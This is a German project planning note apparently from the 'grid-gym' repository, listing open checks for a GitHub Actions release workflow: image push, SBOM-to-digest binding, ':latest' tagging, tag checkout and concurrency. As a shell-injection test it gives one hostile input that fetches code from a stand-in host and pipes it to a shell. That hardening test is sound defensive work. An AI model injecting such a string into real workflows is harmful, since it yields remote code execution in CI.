# 032 — Release-Workflow-Sensor-Run-Verifikation

**Status:** Open — Trigger-Watch
**Datum:** 2026-06-05
**Quelle:** M6-Welle-2-Post-Closure-Review-Folge F1 HIGH
([`../done/M6-welle-2.md §9 DoD`](../done/M6-welle-2.md);
1 verbleibendes DoD-Item nach Welle-2-C4b-Closure).

---

## Trigger

M6-Welle-2 hat `.github/workflows/release.yml` produktiv
geliefert + lokal verifiziert (actionlint + shellcheck +
`make sbom`/`make fullbuild` gruen). Was im Repo-only-Stand
**nicht erbracht** ist:

- Reale GitHub-Actions-Workflow-Ausfuehrung mit allen drei
  Jobs (`build-and-publish-image` / `produce-assets` /
  `create-release`).
- GHCR-Push gegen `ghcr.io/<owner>/grid-gym:<tag>` + `:latest`
  (letzteres nur bei Tag-Push; siehe ADR 0042 §2.3).
- GitHub-Release-Erstellung via
  `softprops/action-gh-release@v2` mit allen 5 Asset-Files
  (SBOM + JUnit-XML + Coverage-HTML + OpenAPI-JSON + Demo-
  Abnahme-MD).
- Job-zu-Job-Artifact-Sharing (`upload-artifact@v4` ↔
  `download-artifact@v4`) inkl. SBOM-Sharing zwischen
  `build-and-publish-image` und `produce-assets` (post-F2-
  Refactor).
- Tag-Trigger-Routing (`v*.*.*`-Glob-Pattern matcht
  korrekt; `github.ref_name` resolved zur Version).
- `workflow_dispatch`-Input-Wiring
  (`inputs.version`-Read-Pfad).
- `docker buildx imagetools create`-Pattern fuer
  Conditional-`:latest`-Push (F3-Substanz).

Diese Verifikationen sind nur durch realen Lauf gegen GitHub
moeglich; lokales `act` (https://github.com/nektos/act) ist
keine vollwertige Alternative (kein Push-Mock, kein
Release-Create, kein Multi-Job-Artifact-Store).

## Erwartete Lieferung

Eigenstaendiger Sensor-Run-Slice (M6-Welle-3-Pre-Substanz
oder spaeterer):

- **Push** aller Welle-2-Commits (`0cc28f3..b41b7fc`) auf
  `origin/main` plus die Welle-2-Post-Closure-Review-Folge
  (F1..F4-Korrekturen).
- **Workflow-Aktivierungs-Variante A**: Manual
  `workflow_dispatch` ueber GitHub-UI gegen einen Pre-
  Release-Tag-Namen (z. B. `v0.0.0-welle2-sensor-run`).
- **Workflow-Aktivierungs-Variante B**: Echter Tag-Push
  (`git tag v0.1.0 && git push --tags`) wenn ein erstes
  Release geplant ist.
- **Verifikation**:
  - Alle 3 Jobs gruen.
  - GHCR-Image publiziert (`docker pull ghcr.io/<owner>/
    grid-gym:<tag>` lokal nachpruefbar).
  - GitHub-Release angelegt mit 5 Asset-Files (UI-
    Pruefung).
  - **SBOM-Asset bindet an gepushten Image-Digest**
    (ADR 0042 §2.1 + Review-Folge-2-F1 + Review-Folge-3-
    F1-Korrekturen). Pruefung: SBOM-Datei enthaelt
    `metadata.component.bom-ref`/`purl`-Verweis auf den
    Digest aus `docker/build-push-action`-Output. Pflicht-
    Pattern: `docker pull` mit `docker/login-action`-
    Credentials zieht das Image in den Host-Daemon, dann
    Syft mit `docker:<image>`-Reference (Daemon-Source).
    Verboten als ADR-Bruch:
    - Re-Einfuehrung von `make sbom` (`sbom: build`-
      Dependency triggert lokales Re-Build und bricht
      Digest-Bindung).
    - Syft ohne `docker:`-Prefix (Registry-Pull ohne
      Auth — bei privatem GHCR-Package nicht
      pullbar).
  - **`:latest`-Tag nur wenn Tag-Commit == aktueller
    Default-Branch-Tip** (ADR 0042 §2.3 + Review-Folge-
    2-F3 + Review-Folge-3-F3-Korrekturen). Pruefung:
    `git rev-parse refs/remotes/origin/<default-branch>`
    muss `git rev-parse HEAD` gleichen. Ancestor-Match
    (alter, nachtraeglich gesetzter Tag auf historischem
    Main-Commit) ist NICHT ausreichend — alte Tags
    duerfen `:latest` nicht zurueckdrehen. Voraussetzung:
    `actions/checkout@v4` mit `fetch-depth: 0` UND
    `ref: <resolved-tag-ref>`. Race-Condition (Push auf
    Default-Branch zwischen Tag-Push und Workflow-Start)
    toleriert: `:latest` wird nicht aktualisiert, lieber
    konservativ als faelschlich.
  - **workflow_dispatch checkt Tag-Commit aus, nicht
    Dispatch-Branch-Tip** (Review-Folge-3-F4-Korrektur).
    `inputs.version` muss ein **existierendes Tag-Name**
    sein; alle 3 Jobs (build-and-publish-image / produce-
    assets / create-release) checken `refs/tags/${version}`
    aus. Damit zeigen Image-Build, Asset-Erzeugung und
    Release-Notes-Generierung auf denselben Commit —
    egal ob via Tag-Push oder Manual-Dispatch.
  - **workflow_dispatch-Input ist Shell-Injection-sicher**
    (Review-Folge-4-F1-Korrektur). Pruefung mit
    bewusst-boesem Dispatch-Input (z. B. `"; curl evil |
    sh; "`): der `Resolve refs`-Step MUSS mit
    `::error::Invalid version input: ...`-Output fehl-
    schlagen, BEVOR irgendein Image-Build oder Push
    ausgefuehrt wird. Validierung gegen striktes SemVer-
    Tag-Regex; Input per `env`-Variable (NICHT direkte
    `${{ ... }}`-Shell-Interpolation). Verbotene
    Alternative: jegliche Re-Einfuehrung von
    `VERSION="${{ inputs.version }}"` direkt im `run:`-
    Block.
  - **Concurrency-Key basiert auf Version, nicht
    `github.ref`** (Review-Folge-4-F3-Korrektur). Pruefung:
    paralleler Tag-Push + Manual-Dispatch fuer dieselbe
    Version `v0.1.0` darf **nicht** parallel laufen
    (gleicher `concurrency.group`). `group: release-${{
    github.event.inputs.version || github.ref_name }}`
    resolved zur tatsaechlich-zu-veroeffentlichenden
    Version.
- **Slice-Doc**:
  - `done/M6-welle-2.md §9 DoD` Box „Reale Workflow-Run-
    Verifikation" auf `[x]` mit Sensor-Run-Hash + Run-ID-
    Pointer + GHCR-Image-Digest-Beleg.

## Aktivierung

Aktivierung erfolgt sobald **eine** der folgenden
Bedingungen eintritt:

1. **Erster echter Release-Tag** (`v0.1.0` oder erste
   `v*.*.*`-Veroeffentlichung) wird gepusht.
2. **M6-Welle-3-C0** (CI/CD-Vollausbau) entscheidet,
   ob Sensor-Run als Welle-3-Pre-Substanz oder als
   spaetere Operation lebt.
3. **Stakeholder-Druck** (z. B. erstes
   Compliance-Audit) verlangt einen produktiven Release-
   Lauf.

## Konsequenz wenn ungeloest

- ADR-0042-Substanz bleibt **substantiell verifiziert
  aber nicht produktiv-bewiesen**: SBOM-Tool gegen
  Runtime-Image (lokal verifiziert), Release-Workflow-
  Form (actionlint + shellcheck gruen), Asset-Extraktion
  (lokal verifiziert) — aber das End-to-End-GitHub-
  Mechanismus-Substrat ist unbestaetigt.
- 5 GitHub-Actions-Standard-Pattern-Klassen bleiben
  Restrisiko-behaftet (siehe
  [`../done/M6-welle-2.md §10.3`](../done/M6-welle-2.md)):
  GHCR-Push-Permission, Release-Create, Artifact-Sharing,
  Tag-Trigger-Routing, workflow_dispatch-Input-Wiring.
  Alle sind millionenfach-vorbild-getestet im OSS-
  Ecosystem; **kein grid-gym-spezifisches Risiko**.

## Bezuege

- [`../done/M6-welle-2.md §9 DoD`](../done/M6-welle-2.md)
  — 1 verbleibendes DoD-Item nach Welle-2-C4b-Closure.
- [`../done/M6-welle-2.md §10.3`](../done/M6-welle-2.md)
  — Restrisiko-Inventar mit 5 GitHub-Actions-Standard-
  Pattern-Klassen.
- [`../../adr/0042-sbom-tool-and-release-pattern.md §5`](../../adr/0042-sbom-tool-and-release-pattern.md)
  — Welle-2-C2-Hash-Anchor + Welle-2-C3-Substanz +
  M6-Welle-7-Closure-Accept-Plan.
- [`../../../../.github/workflows/release.yml`](../../../../.github/workflows/release.yml)
  — Workflow-Substanz (Sensor-Ziel).
- [`../../../../README.md`](../../../../README.md) +
  [`../../../../README.de.md`](../../../../README.de.md)
  — User-Doku zum Release-Workflow.
